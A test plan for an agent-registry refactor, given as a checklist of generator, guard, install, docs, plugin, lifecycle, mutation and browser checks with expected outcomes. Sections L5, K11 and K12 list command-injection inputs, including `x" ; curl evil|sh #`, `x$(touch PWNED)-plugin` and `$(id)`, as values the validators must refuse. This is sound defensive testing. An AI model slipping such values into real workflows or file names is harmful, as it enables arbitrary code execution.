# Test plan: Agent registry

Every checkbox states the input and the exact expected outcome. A ticked box carries evidence after ` — evidence: ` (commit hash, log path, counts, screenshot path).

Areas: **R** generator, **G** guard (add and remove), **I** install, **D** docs pages, **C** connector, **P** plugins, **B** boundaries, **F** facts and folded tests, **L** lifecycle gate (throwaway worktrees), **K** checks and refusals added by steps 33 to 38, **M** mutations, **W** Playwright walks, **O** owner-run.

Paths are relative to the repository root. Unit rows run with `pnpm --filter <package> exec vitest run <file>`; **L** rows run with `pnpm test:lifecycle` and are slow (each worktree row takes minutes).

## Parity with main (the goldens were replaced)

The Step 4a goldens were deleted in Step 31: the owner delegated the open questions on 2026-11-06 and the parity claim is now proved by a direct diff against `origin/main` plus the registry-driven surface tests.

- [ ] Install page parity — on `origin/main` (checked out in a scratch worktree) render the install page for `en_US` and `pt_BR`, each with and without a standby (agent `Ana`, standby `Lia`, link `https://golden.example/c/zb_conn_GOLDEN/mcp`); render the same on the head. Expected: after sorting the sections by heading and the "Identify your product" list, the two renders are byte-identical for all four cases.
- [ ] `libs/agents/testing/surfaces.test.ts::the %s matrix lists every agent in the registry order` (`en`, `pt-br`) and `::the install page in %s lists the product sections in the registry order` (`en_US`, `pt_BR`) — expected: 4 cases green. Mutation: swap two entries in `libs/agents/src/order.ts` output (or change a `rung`) -> these cases fail naming the surface.
- [ ] Reorder commit `8239e732` (Step 13b): `git show 8239e732 --stat` and `git show 8239e732` — expected: only the three orders change (install page sections claude-code, codex, cursor, gemini-cli, hermes, openclaw, claude-ai, grok-bot, chatgpt, grok-web; matrix swaps only Grok Bot and claude.ai; `Agents` and `IAs` equal the matrix order) and no content line of any section, row or page; `libs/agents/generate/order.test.ts::lists the definitions by wake rung, then by lower-case English name` is green.
- [ ] No golden remains — `git ls-files libs/agents/testing | grep -i golden` returns 0 lines and `git grep -n 'golden.test' -- libs tools` returns 0 lines outside `docs/`.

## The contract tests (each was red before its code; the red commit precedes the green one in `git log`)

- [ ] `libs/agents/generate/discover.test.ts::lists the folders under supported in name order` — input: root `libs/agents/supported`; expected: the 11 ids of `REAL_AGENT_IDS` in name order, each with `folder === libs/agents/supported/<id>`. `::takes a root that is itself an agent folder` — roots `libs/agents/testing/fixture-agent` and `fixture-plugin-agent`; expected ids `fixture-agent`, `fixture-plugin-agent`. `::reads the facets from the files that are present` — install, connector and plugin fixtures carry `definition, page.en, page.pt-br, install` plus `connector` or `plugin`.
- [ ] `tools/repository-shape/src/agent-registry.test.ts::G1: an install agent changes exactly the generated set` — green; mutation: make `planGeneratedFiles` ignore the extra root -> the case fails.
- [ ] `libs/agents/supported/cursor/install.test.ts` (`adds the HTTP server and listens in a background terminal in %s`, `ends its setup step with what success looks like in %s`, `never uses Grok Bot wording`) — expected: green for `en_US` and `pt_BR`; the section text equals `libs/agents/supported/cursor/install.en_US.md` and `install.pt_BR.md`.
- [ ] `agent-registry.test.ts::every agent page in apps/docs is the copy of its folder page: $id in $language` (22 cases, 11 agents × 2 languages) — expected: green; each case compares `apps/docs/agents/<id>.mdx` (or the `pt-br` twin) byte for byte with `libs/agents/supported/<id>/page.en.mdx` (or `page.pt-br.mdx`). Mutation: append a line to `apps/docs/agents/cursor.mdx` -> the case `cursor in en` fails (and `every generated file is fresh` fails too, which is kept as the second guard).
- [ ] `libs/agents/supported/codex/connector.test.ts` (`resumeArguments`, `newSessionArguments`, `isolation`, `findNewestSessionId`) and the same file of `claude-code` — expected: every case name of the source tests on `origin/main` (`apps/connector/test/unit/`) is present by name in the moved files; the counts are not equal and are recorded: `origin/main` has 85 cases (79 moved plus 6 that stay in `apps/connector/test/integration/wake-isolation.test.ts`), the head has 83 (claude-code 16, codex 67). Procedure: list the names on `origin/main` with `git grep -hE "^\s*(test|it)(\.each\([^)]*\))?\(" origin/main -- apps/connector/test/unit`, and check each against the moved files.
- [ ] `libs/agents/src/checks/plugins.test.ts` (`accepts every registered plugin against the repository`, `rejects a plugin package that no plugin.ts claims`, `rejects a version pin that the file does not match`) — expected: green; each rejection names the plugin.
- [ ] `agent-registry.test.ts::no file outside an agent folder names an agent` — expected: `[]`; planting `const x = 'cursor'` in `apps/api/src/app.ts` makes it list `apps/api/src/app.ts:<line> names cursor`.
- [ ] Red history — `git log --oneline` on the branch shows, for every `(red)` step of the plan (6, 7, 10, 11, 14, 17, 20, 22), a `test(...)` commit before its `feat`/`fix`/`refactor` commit; the printed red text of each is in `tester-briefing.md`. Expected: 8 of 8 steps in that order.

## R. Generator (`libs/agents/generate/*.test.ts`)

- [ ] Folder name `Cursor` (uppercase) — expected: violation `supported/Cursor: the folder name must match ^[a-z][a-z0-9-]*$`.
- [ ] Folder named `supported-agents` — expected: violation `supported-agents is the matrix page`.
- [ ] Folder without `definition.ts` — expected: violation naming the folder; no output for it, no deletion.
- [ ] Two definitions with `enumMember: 'Codex'` — expected: violation naming both folders.
- [ ] `enumMember: 'chat_gpt'` — expected: violation `enumMember must be PascalCase`.
- [ ] Order — input: the eleven definitions; expected: `claude-code, codex, cursor, gemini-cli, hermes, openclaw, claude-ai, grok-bot, chatgpt, grok-web, any-mcp-client`.
- [ ] `ids.ts` — expected: `AgentId` has 11 members with today's names and values; `InstallClient` 10; `ConnectorClient` `ClaudeCode`, `Codex`; `PluginAgent` `Hermes`, `OpenClaw`; the first line is the `// NB ADR 0033:` pointer.
- [ ] Matrix en — input: delay `7`, `3600`, `null`; expected cells: `7 seconds`, `1 hour`, `Not measured`; pt-BR: `7 segundos`, `1 hora`, `Não medido`; rung cells from `WAKE_RUNG_LABELS`.
- [ ] `expectedDelaySeconds: 0` or `-1` — expected: violation `expected delay must be positive or null`.
- [ ] Nav — expected: `Agents` = `['agents/supported-agents', …11 in order]`, `IAs` = the `pt-br/` twins in the same order; every other group byte-identical.
- [ ] Nav with a foreign page `guides/webhook-wake` in `Agents` — expected: violation naming it.
- [ ] Page with headings out of order (pt-BR) — expected: violation `<id> page.pt-br.mdx: expected O que funciona | Como ela escuta | Configure do zero | Confira se funciona but found …`.
- [ ] A page missing one of its `pageFacts` — expected: violation naming the agent, the language and the string.
- [ ] Orphan `apps/docs/agents/ghost.mdx` with no folder — expected: deletion planned for that path and its pt-br twin, nothing else.
- [ ] Idempotence — run `agents:generate` twice; expected: the second run writes 0 files.
- [ ] Working directory — run the CLI from `apps/docs`; expected: the same plan as from the root.
- [ ] `agents:check` on a fresh tree — expected: exit 0, prints `0 stale, 0 deletions, 0 violations`.

## G. Guard (`tools/repository-shape/src/agent-registry.test.ts`)

- [ ] **G1 Add:** plan(real agents + `testing/fixture-agent`) compared with plan(real agents). Expected: the changed paths are exactly `libs/agents/src/generated/ids.ts`, `libs/agents/src/generated/definitions.ts`, `libs/agents/src/generated/install.ts`, `libs/agents/testing/fixture-agent/install.en_US.md`, `libs/agents/testing/fixture-agent/install.pt_BR.md`, `apps/docs/agents/fixture-agent.mdx`, `apps/docs/pt-br/agents/fixture-agent.mdx`, `apps/docs/snippets/agents/matrix.mdx`, `apps/docs/snippets/pt-br/agents/matrix.mdx`, `apps/docs/docs.json`. No other path.
- [ ] **G1 content:** `ids.ts` holds `FixtureAgent = 'fixture-agent'` in `AgentId` and `InstallClient`; both matrices have one `[Fixture Agent](/agents/fixture-agent)` / `[Agente de teste](/pt-br/agents/fixture-agent)` row; `Agents` and `IAs` list the page; `renderInstallPage` given the planned sections holds `## Fixture Agent` once and names `Fixture Agent` in "Identify your product"; guide parity, the install-section checks and the heading checks each list `fixture-agent` among the agents they checked, with 0 violations. The listen-token leg is checked on the fixture by `libs/agents/testing/fixtures.test.ts::states its rung, the pending loop, the re-call and no time limit` and `::has the four headings in order` (both languages, all three fixtures), not by `docs-experience.test.ts`: that file reads the pages of the real tree under `apps/docs`, and a planned fixture writes no file there.
- [ ] **G2 Confinement:** a spy on `readSource` while planning the fixture. Expected: every path read for `fixture-agent` starts with `libs/agents/testing/fixture-agent/`.
- [ ] **G2c Connector fixture:** plan + `testing/fixture-connector-agent`. Expected: the G1 set plus `libs/agents/src/generated/connector.ts` and the two connector snippets; `ConnectorClient` gains `FixtureConnectorAgent`; the connector unit suite runs the fixture runtime against its fake binary.
- [ ] **G2b Plugin fixture:** plan + `testing/fixture-plugin-agent`. Expected: the G1 set plus `libs/agents/src/generated/plugins.ts`; the plugin check lists `fixture-plugin-agent`.
- [ ] **G3 Remove, every agent:** `agent-registry.test.ts::G3: %s vanishes from every planned file`, one case per real id (11). Input: plan(real agents − `supported/<id>`). Expected: deletions are exactly `apps/docs/agents/<id>.mdx` and `apps/docs/pt-br/agents/<id>.mdx`; violations equal the real plan's violations that do not start with `<id> `; no planned file contains `agents/<id>)` or `'<id>'`; each matrix keeps `10` rows. Note: `api2.cursor.sh` in the Grok Bot page is not a match, so the assertions use the tokens above, not the word.
- [ ] **G4 No leak, every agent:** `agent-registry.test.ts::G4: %s leaks nowhere`, one case per real id (11), over `treeLeakViolationsOf` on every tracked file. Expected: 0 lines ending ` names <id>` per id; the aggregate `no file outside an agent folder names an agent` is `[]`. The forms the scan knows are in area K.

## I. Install

- [ ] Each of the 22 moved renders (10 agents × 2 locales, 2 of them the Grok web standby pair; named `<id>.en_US.md`, `<id>.pt_BR.md`): `git diff -M origin/main` shows a 100% rename from `libs/core/src/install/snapshots/` and 0 content lines changed.
- [ ] `apps/api` integration `GET /i/:code` (valid) — expected: body byte-identical to the body on `origin/main` for a seeded code, except the section order (rung then name); same `Cache-Control: no-store`, `X-Robots-Tag: noindex`.
- [ ] `libs/core/src/install/render-install-page.test.ts::renders only the sections it is given` — input: two synthetic sections `Alpha`, `Beta`; expected: `## Alpha`, `## Beta`, "Identify your product" names exactly `Alpha, Beta`.
- [ ] `libs/core` imports no `InstallClient`. Expected: `git grep -n InstallClient -- libs/core` returns 0 lines.
- [ ] `libs/agents/src/checks/install-sections.test.ts::accepts the install section of every real agent` — expected: green for 10 agents × 2 locales (first step is the stop check, last step is the localized self-test, every step ends with `Success:`, set_wake modes ⊆ `setWakeModes`, `zb_conn_` only inside the link, two renders identical, the package version comes from `ZAPBIP_NPM_VERSION`); the bypasses are in area K.
- [ ] `install-set-wake-modes.test.ts` — expected: every mode named by any section is accepted by the server schema, for 10 agents.
- [ ] Guide parity — expected: for each step-guide agent, the actions in the page's set-up section (found by heading) equal the section's actions in order.

## D. Docs pages

- [ ] `git diff origin/main -- apps/docs/agents apps/docs/pt-br/agents ':!*supported-agents*'` — expected: empty.
- [ ] Step 15 pages — the pages are generated into `apps/docs`, so git shows 22 creates under `libs/agents/supported/*/page.*.mdx` and the `apps/docs` copies stay. Expected: each folder page is byte-identical to the page on `origin/main` (`git diff origin/main --no-index` or `git show origin/main:<page> | cmp`), 22 of 22.
- [ ] Matrix pages — expected: the table is gone from both hand-written pages; each imports `/snippets/agents/matrix.mdx` or `/snippets/pt-br/agents/matrix.mdx` once.
- [ ] `mint broken-links` (gate `docs`) — expected: exit 0.

## C. Connector

- [ ] `git diff -M origin/main` for Step 18 — expected: the moved functions are identical except imports. The security reviewer confirms with `git diff -M -w`.
- [ ] Moved `connector.test.ts` for both runtimes — expected: the same case count as the source tests had for that runtime (record the counts).
- [ ] `apps/connector` `test:unit`, `test:e2e`, `test:packaging` — expected: green; the usage line reads `--client claude-code|codex`.
- [ ] `apps/connector/test/e2e/connect.e2e.test.ts` — expected: runs once per `ConnectorClient` (2: claude-code, codex) through `apps/connector/test/support/connector-clients.ts`; `apps/connector/test/integration/wake-runner.test.ts` runs the decoy-MCP case for every runtime whose `strictMcpArgument` is not null.
- [ ] Developer pages en and pt-br — expected: `apps/docs/developers/local-connector.mdx` and its pt-br twin are byte-identical to `origin/main` (the runtime text stays hand-written because it interleaves both runtimes in one sentence); `local-connector-parity.test.ts` is green.

## P. Plugins

- [ ] Every `apps/*-plugin` is claimed by exactly one `plugin.ts` — input: today's tree; expected: `hermes-plugin` → hermes, `openclaw-plugin` → openclaw.
- [ ] Version pins — expected: every pin in both `plugin.ts` files matches `ZAPBIP_NPM_VERSION` (OpenClaw) or `ZAPBIP_HERMES_PLUGIN_VERSION` (Hermes), the same lines `plugin-versions.test.ts` checks today.
- [ ] `apps/hermes-plugin` pytest including `test_constants_parity.py` — expected: green after removing `ChannelPluginProduct`.
- [ ] `test:e2e:clients` with Docker (opt-in) — expected: the same cases pass as on `origin/main`, now under `channel-plugins.e2e.test.ts`, once per plugin.
- [ ] Deploy preflight — expected: the published package specs equal `zapbip@<v>` and `@zapbip/openclaw-plugin@<v>`, read from `AGENT_PLUGINS` (every `PluginRegistry.Npm` entry); Hermes is not in them (ADR 0034).
- [ ] Hosted artifacts — expected: `GET /pkg/<wheel>` and `GET /pkg/<requirements>` return the same bytes, `content-type` and 404s as on `origin/main` (`apps/api/test/integration/package-route.test.ts`, import changes only); the preflight wheel step (`PreflightStep.PluginWheel`, `apps/api/test/unit/deploy-preflight.test.ts`) refuses with the same text; `HERMES_INSTALL_COMMAND` is read from `supported/hermes` and `apps/api/test/e2e/hosted-wheel.e2e.test.ts` passes; the hash rewrite lives in `scripts/plugin-wheel/build.ts` and `supported/hermes/wheel.ts`, checked by `supported/hermes/wheel.test.ts` and `wheel-package.test.ts`.
- [ ] `@zapbip/core` no longer exports `HERMES_INSTALL_COMMAND`. Expected: `git grep -n HERMES_INSTALL_COMMAND -- libs/core apps/docs tools` returns 0 lines outside `libs/agents`.

- [ ] Hash embedding — for each plugin with an artifact marked `embeddedInInstallCommand`: `installCommand` contains the artifact's `expectedSha256`; Hermes: the requirements hash is in `HERMES_INSTALL_COMMAND` and the requirements file in `releaseFolder` contains the wheel hash. Mutation: change one hex digit in `plugin.ts` -> fails naming the plugin and the artifact `label`.
- [ ] `routes/package.ts` — the allowlist equals the artifact filenames: `GET /pkg/<wheel>` and `GET /pkg/<requirements>` are 200; `/pkg/other.whl`, `/pkg/../x` and a `\n` suffixed name are 404 exactly as on `origin/main`.
- [ ] Generic build — `pnpm plugin-wheel:build hermes` rewrites the hashes in `supported/hermes/wheel.ts` by exact-line match and fails on a missing line; `pnpm plugin-wheel:build fixture-plugin-agent` builds nothing outside the fixture; the root `package.json` scripts contain no agent name (`git grep -n -i 'hermes\|openclaw' package.json` returns 0 lines).
- [ ] Workflow rows — the `unit` matrix rows and pip-install lines of `verify.yml` equal what `planGeneratedFiles` renders from `AGENT_PLUGINS`; hand-editing one row fails `every generated file is fresh`. Adding `testing/fixture-plugin-agent` to the plan adds one row and one pip line, and no other changed path is outside the G1 set plus `verify.yml`.
- [ ] Two-folder proof — O4 below.

## B. Boundaries

- [ ] B1 `libs/core` and `libs/types` import no `@zapbip/agents`. Expected: 0 hits.
- [ ] B2 An agent folder imports no other agent folder and no `apps/*`. Expected: 0 hits.
- [ ] B3 `definition.ts`, `install.ts`, `install-copy.ts`, `plugin.ts` import no `node:` module. Expected: 0 hits.
- [ ] B4 `apps/api/src` imports only `@zapbip/agents/install` and `@zapbip/agents/plugins`. Expected: 0 other subpaths.
- [ ] B5 Worker bundle: `wrangler deploy --dry-run --outdir <scratchpad>` for `apps/api`. Expected: the bundle contains none of `Set up from zero`, `Configure do zero`, `How it listens`, `marked` or `smol-toml` (no size baseline exists: S4 was struck from the plan).
- [ ] B6 `apps/connector/dist/cli.js` (after `pnpm --filter zapbip build`) — expected: contains none of the page headings in B5, `marked` or the install-section copy; `apps/connector/test/packaging/packaging.test.ts` is green.
- [ ] B7 `libs/types/src` declares no agent enum. Expected: no `AgentId`, `InstallClient`, `ConnectorClient`, `DocsOnlyClient`, `ChannelPluginProduct`.

## F. Facts and folded tests

- [ ] The rung and delay checks of `docs-experience.test.ts` read `AGENT_DEFINITIONS`. Expected: no `CLIENT_LISTEN_FACTS` left (`git grep` 0).
- [ ] The background-running link is allowed exactly on the pages of agents with a connector facet (claude-code, codex), in both languages.
- [ ] Speaker labels — `docs-conversations.test.ts` derives `SPEAKER_LABELS` from the fixed labels plus every `speakerNames`; the derived set is a superset of today's list (Owner, You, Dono, Você, Voce, Agent, Agente, zapbip, Claude Code, Claude, Codex, ChatGPT, Grok Bot, Grok, Cursor, Gemini CLI, Gemini, Hermes, OpenClaw). Mutation: drop `Gemini` from gemini-cli's `speakerNames` -> the superset test fails naming it.
- [ ] `connectCommand` — the argument type is `ConnectorClient`; `connectCommand({ client: 'nope' })` does not typecheck. `apps/connector/test/unit/cli.test.ts`: `--client nope` throws the usage line, and a missing `--client` throws it too; neither falls back to a default.
- [ ] `tools/install-e2e` is gone: `git ls-files tools/install-e2e` returns 0 lines; `delivery-docs.test.ts` no longer lists it; `git grep -n 'tools/install-e2e' -- . ':!docs/features' ':!docs/adr'` returns 0 lines; `AGENTS.md` names the script only at `libs/agents/supported/claude-code/install-e2e.sh`.
- [ ] READMEs and rules — `apps/connector/README.md` and `libs/core/README.md` state purpose only and name no moved path; `git grep -n 'libs/core/src/install/prompts\|snapshots\|scripts/hermes-wheel\|scripts/e2e/clients' -- AGENTS.md .claude/rules '*/README.md'` returns 0 lines of stale paths; `rules.test.ts` is green.
- [ ] `install-e2e.test.ts` iterates the agents with `install-e2e.sh`. Expected: 1 (claude-code); every existing assertion holds at the new path.

## L. Lifecycle gate (`tools/repository-shape/src/agent-lifecycle.test.ts`, throwaway worktrees)

- [ ] L1 Gate placement: `pnpm test` and the default `vitest.config.ts` do not include `agent-lifecycle.test.ts`; `pnpm test:lifecycle` (`vitest.lifecycle.config.ts`) runs it; `scripts/verify-gates.tsv` lists `lifecycle` for `libs/agents/*`, `tools/repository-shape/*`, `apps/connector/*`, `apps/*-plugin/*`, `.agents/hooks/*` and `.github/workflows/*`; `scripts/verify.sh all` runs it. Expected: `scripts/verify.test.sh` and `tools/repository-shape/src/ci-workflow.test.ts` green.
- [ ] L2 CI job: `.github/workflows/verify.yml` has a job `lifecycle` that runs `pnpm test:lifecycle` with `timeout-minutes: 30`, separate from the unit job. Expected: `ci-workflow.test.ts` fails if the job or its timeout is removed.
- [ ] L3 `the removal covers one agent of each kind` — expected: green and fast: at least 2 ids removed, fewer connector ids removed than exist, every removed id is in `AGENT_DEFINITIONS`, every one is discovered under `libs/agents/supported`.
- [ ] L4 `removing one agent of each kind leaves the removed folders and the generated set as the only diff, and every suite stays green` — input: in a throwaway worktree `git rm -r` every connector agent but the first, every plugin agent and one install-only agent, `pnpm install --no-frozen-lockfile --offline`, `pnpm agents:generate`. Expected: generate exits 0 (it must not refuse over the pages it is about to delete); the only changed paths outside the removed folders are generated files (and `pnpm-lock.yaml` when a plugin package went); then the agents, shape, connector, api unit, api integration and `agents:check` suites are green. This is the generate-then-check flow after a folder removal.
- [ ] L5 `agents:check refuses each planted violation and names the agent and the file` — input: a worktree at HEAD where `agents:check` is clean (exit 0), then each plant in turn: an id in `apps/api/src/app.ts`; a connector with a null strict flag and no reason; an install section with a two-line product name; a plugin whose workflow filter is `x" ; curl evil|sh #`. Expected: for each plant, exit non-zero and the output names the agent id and the file (or the agent folder).
- [ ] L6 `scaffolding $name changes only its folders and the generated set, and every suite stays green` (3 cases: install agent, `--connector`, `--plugin`) — input: `pnpm agents:new scaffold-probe-<random> [flag]`, `pnpm agents:generate`. Expected: generate exits 0; the changed paths are under `libs/agents/supported/<id>/`, `apps/<id>-plugin/` or generated; every suite is green.
- [ ] L7 `agents:generate writes nothing and exits non-zero while a registry check fails` — input: append `\n\n## Extra` to the rendered text of one install agent's `install.ts`, run `pnpm agents:generate`. Expected: exit non-zero, output contains `<id> in en_US: the section must hold exactly one heading`, and `git status --porcelain` lists only the edited `install.ts`.
- [ ] L8 `agents:check reports an unreadable tracked file as a line and exits 1` — input: `chmod 000 README.md` in a worktree, `pnpm agents:check`. Expected: exit 1, output contains `README.md: cannot be read (EACCES)` and no `node:fs` stack frame.
- [ ] L9 `tools/repository-shape/src/throwaway-worktree.test.ts` — expected: green: `isOutside` accepts the lockfile only when a plugin package is involved, `removing it also deletes the temporary parent folder`, `a checkout first prunes the worktrees whose folder is gone`. After a lifecycle run, `git worktree list` shows no `zapbip-worktree-*` entry and `ls $TMPDIR | grep zapbip-worktree` is empty.

## K. Checks and refusals added by steps 33 to 38

- [ ] K1 `agents:check` runs every check: `libs/agents/generate/registry-checks.test.ts` — `accepts the fixtures`; `names the file and the agent of an id planted outside its folder`; `names the connector agent whose strict flag is null with no reason`; `keeps a justified null strict flag`; `names the agent whose install section holds a second heading`; `names the plugin agent whose workflow filter is an injection`. Expected: 6 of 6 green. Real tree: `pnpm agents:check` prints `0 stale, 0 deletions, 0 violations` and exits 0, and the planner violations plus install-section, guide-parity, connector, plugin, leak and boundary violations all appear in its output when planted (L5).
- [ ] K2 Generate refuses on any violation: `libs/agents/generate/write.test.ts::leaves every file untouched when the plan holds a violation` (plan-level) and L7 (registry-level). Expected: both green; a violation only `agents:check` raises (extra heading, duplicate product name, leak, connector rule, lookalike name) leaves every file unchanged and the exit code non-zero; `::reports a deletion as deleted and a write as wrote` prints `wrote <path>` and `deleted <path>` on a valid plan.
- [ ] K3 Leak forms — `libs/agents/src/checks/leaks.test.ts` with agents `alpha` (ordinary word), `beta`, `delta`, `gamma-bot`: names the id as an enum member of `AgentId`, `InstallClient`, `ConnectorClient` or `PluginAgent` (`names the file and line that uses %s.Alpha`); a `Record` keyed by a member or by the whole enum; the quoted id in `'`, `"` and backticks; a path under `supported/<id>`; a bare hyphenated id (`gamma-bot`) with letter and digit boundaries (`gamma-bots`, `xgamma-bot`, `gamma-bot2`, `developers/gamma-bot` ignored); the PascalCase product word (`PreflightStep.AlphaWheel`, `refuseAlphaWheel`, `the Alpha plugin` named; `Alphabet`, `alphaValue` ignored); the uppercase constant word (`GAMMA_BOT` named; `XGAMMA_BOT`, `GAMMA_BOTS`, `GAMMA_BOT2` ignored); `apps/<id>-plugin` outside the plugin; the home folder and variable literals of a connector runtime. An id that is an ordinary word (only `cursor`) is matched quoted only (`database alpha`, `api2.alpha.sh` ignored). Expected: every case green.
- [ ] K4 Leak scan coverage — `libs/agents/generate/leak-scan.test.ts::scans a .%s file` for `js`, `cjs`, `cts`, `jsx`, `yaml`, `toml` (6 cases): `<path>:1 names fixture-agent`. Exempt as a whole: `pnpm-lock.yaml`, `.agents/skills/brainstorming/scripts/server.cjs` and `start-server.sh` (vendored or generated), `.agents/hooks/hooks.test.sh`; literal-only exempt: `doctor.sh` and `remind-docs.sh`. Expected: `agent-registry.test.ts::no file outside an agent folder names an agent` is `[]`.
- [ ] K5 Tracked-file listing — `libs/agents/generate/source.test.ts` in a temporary git repo: `lists a path with non-ASCII characters` (`docs/guia-configuração.ts` is listed, not dropped); `skips a tracked symlink instead of following it`; `skips a tracked file deleted from the working tree`; `fails on a listed path that cannot be read` (a `chmod 0` file throws `locked.ts: cannot be read (EACCES)`). Expected: 4 of 4 green.
- [ ] K6 Install-section heading bypasses — `libs/agents/src/checks/install-sections.test.ts`, input: the fixture section plus a tail; expected `<id> in en_US: the section must hold exactly one heading` for each: a second `## Other`, a first-level `# Other`, underlined `Other\n-----` and `=====`, `##\tOther`, an indented `   ## Other`, a bare `##`, carriage-return line ends, `<h2>Other</h2>`, inline `Text <h2>Other</h2>`, `<Heading level={2}>Other</Heading>`, `##Other` (no space), an unclosed code fence, an unclosed `<!--`, a heading in a list item, an inline fence that is no fence. Expected: every case green (one case per bypass).
- [ ] K7 Format characters — input: the fixture section plus `\n\n\u200B## Other` (zero-width space), `\uFEFF## Other` (byte order mark), `\u2028## Other`. Expected: `<id> in en_US: the section must not hold format characters` for each. For `productName` or `productDescription` holding `\u200B` or `\uFEFF`: `<id>: the product name must not hold format characters` (and the description twin). For `\u2028`, `\u2029`, `\v`, `\f`, `\u0085`, a newline or more than 120 characters (`INSTALL_PRODUCT_TEXT_MAX_LENGTH`) in either field: `<id>: the product name must be one line of at most 120 characters`.
- [ ] K8 Lookalike product names — input: two entries, the first `Fixture Agent`, the second named `fixture agent`, `Fixture  Agent`, `Fixture\u200B Agent` or `\uFF26ixture Agent` (full-width F). Expected: `other-agent: the product name <name> is also used by fixture-agent` for each of the 4; a plain second `Fixture Agent` is refused the same way.
- [ ] K9 Enum collision — `libs/agents/src/checks/registry.test.ts::refuses two ids that derive the same member name even when they declare different ones`, and `libs/agents/generate/scaffold.test.ts::refuses an id whose derived names collide with an existing agent`. Expected: both green; `pnpm agents:new` with a colliding id exits non-zero without creating a folder.
- [ ] K10 Scaffold refusals — `scaffold.test.ts::refuses the invalid id "%s"` for `Demo`, `demo_agent`, `1demo`, `supported-agents`, the empty string, and `::refuses an id that already has a folder`; `libs/agents/generate/cli.test.ts`: `agents:new` of an existing agent exits non-zero with `<id> already exists`, `agents:new` without an id prints `usage: agents:new <id>`, an unknown mode prints `usage: agents:<generate|check|new|mentions>`. Expected: all green.
- [ ] K11 Doctor guards — `.agents/hooks/hooks.test.sh` (about 3.5 minutes): `--fix python` with a plugin folder named `x$(touch PWNED)-plugin` prints no `touch`, still prints `pip install --require-hashes -r apps/safe-plugin/requirements-dev.txt`, names `skipped` on stderr, and never creates `PWNED`; a plugin folder whose name holds an ESC (`\e[2J`) skips with a stderr line that holds no raw ESC byte (the folder is printed with `printf '%q'`). Expected: `bash .agents/hooks/hooks.test.sh` prints no `FAIL` line.
- [ ] K12 Plugin workflow and folder validation — `libs/agents/src/checks/plugins.test.ts`: `pluginFolderViolationsOf` refuses `apps/x$(touch PWNED)-plugin`, `apps/a b-plugin`, `apps/a;b-plugin`, a backtick name and the empty string; `pluginWorkflowViolationsOf` refuses the filters `x" ; curl evil|sh #`, `a b`, `$(id)`, `x\ny`, the empty string, the names `x; id`, `@scoped`, `a b`, the empty string, and the requirements paths `x"; id`, `../elsewhere/requirements-dev.txt`, `other/requirements-dev.txt`; accepts the real registry's. `libs/agents/generate/render-workflow.test.ts::hands the requirements path to the step through the environment, never inline`. Expected: green.
- [ ] K13 Self-hosted wheel rules — `plugins.test.ts` (`pluginViolationsOf for a self-hosted wheel`): refuses a plugin whose artifacts are all hosted separately from the install command, and one whose install command embeds two artifacts. Expected: both green; Hermes (one embedded artifact) is accepted.
- [ ] K14 Connector rules — `libs/agents/src/checks/connectors.test.ts`: accepts every registered runtime, a runtime that pins one MCP server with a flag, and a runtime without the flag that says why (`StrictMcpNullReason.DisablesOtherServers`); refuses a null flag with no reason and a flag together with a reason. Expected: 5 of 5 green; mutation: set codex `strictMcpNullReason: null` -> the check and L5 name `codex`.
- [ ] K15 `marked` is a development dependency — `libs/agents/package.json` lists `marked` (exact `18.0.11`) under `devDependencies`, not `dependencies`; `git grep -n "from 'marked'" -- apps libs` lists only `libs/agents/src/checks/install-sections.ts`; B5 and B6 find no `marked` in the Worker or connector bundles. Expected: `pnpm install --frozen-lockfile --offline` succeeds.

## M. Mutations (break it, see red, restore)

- [ ] M1 Add a word to `apps/docs/agents/cursor.mdx`. Expected: `every generated file is fresh` fails naming the path and `run pnpm agents:generate`.
- [ ] M2 Delete `apps/docs/pt-br/agents/cursor.mdx`. Expected: the same test fails with `missing generated file`.
- [ ] M3 Add `apps/docs/agents/ghost.mdx`. Expected: fails with `pending deletion apps/docs/agents/ghost.mdx`.
- [ ] M4 Swap two headings in `supported/codex/page.pt-br.mdx`. Expected: violation with the expected order.
- [ ] M5 Set codex `rung: WakeRung.Webhook` and regenerate. Expected: the matrix row changes and the listen check fails (`page says Local`).
- [ ] M6 Add `const X: Record<InstallClient, string>` in `libs/core/src/install/render-install-page.ts`. Expected: the leak test names the file.
- [ ] M7 Import `@zapbip/agents/docs` in `apps/api/src/routes/install-page.ts`. Expected: B4 fails.
- [ ] M8 Add `import { readFileSync } from 'node:fs'` to `supported/cursor/install.ts`. Expected: B3 fails.
- [ ] M9 Remove the terminal-listen step from the Cursor section. Expected: guide parity fails naming cursor.
- [ ] M10 Make the nav renderer skip pt-BR. Expected: G1 fails naming `docs.json` `IAs`.
- [ ] M11 Delete `supported/hermes/plugin.ts`, keep `apps/hermes-plugin`. Expected: the plugin claim check fails naming `apps/hermes-plugin`.
- [ ] M12 Page-rule mutations — `agent-registry.test.ts::removing $name fails the plan naming the page` (5 cases: the front matter, the install command, the one-listener sentence and the self-test text of the plugin fixture page, and the connection-link placeholder of the install fixture page). Expected: green; each plan violation starts with `<fixture id> <page file>`. Mutation: weaken `libs/agents/src/checks/pages.ts` for one of them -> the matching case fails. (The earlier folded `docs-agent-install` and `install-guides` cases are now these page rules; the shipped feature record is not rewritten.)

## W. Playwright MCP (from the owner's seat; `mint dev` on a free port)

- [ ] W1 Nav en and pt-BR at 1280: `Agents` and `IAs` list the matrix first, then the 11 agents in the planned order; every link opens a 200 page.
- [ ] W2 Supported agents en and pt-BR: 11 rows; Claude Code `Local · 7 seconds`; ChatGPT `Scheduled · 1 hour` / `Agendada · 1 hora`; Grok na web `Em espera · Não medido`; each page link works.
- [ ] W3 Claude Code, Hermes and Grok on the web pages in both languages: the four headings, the rung label, the self-test chat; text identical to `origin/main` screenshots.
- [ ] W4 Narrow width 375: the matrix scrolls horizontally, no overflow off the page; nav opens.
- [ ] W5 Console and network clean: with Playwright MCP, `browser_console_messages` (level `error`) and `browser_network_requests` after each of W1 to W4 on `mint dev` (en and pt-BR, widths 1280 and 375). Expected: 0 console errors, 0 requests with status 4xx or 5xx or a failure, for every page visited. Record the page count and the two zero counts. `apps/docs/e2e/agents.spec.ts` is green over `AGENT_DEFINITIONS` as the scripted twin.
- [ ] W6 Install page on `wrangler dev`: `GET /i/<seeded code>` shows the ten sections; the Claude Code section text equals `supported/claude-code/install.en_US.md`.
- [ ] Screenshots at `.pr-media/agent-registry/`; video of W1 to W3.

## O. Owner-run (scratch worktree, outside the gate)

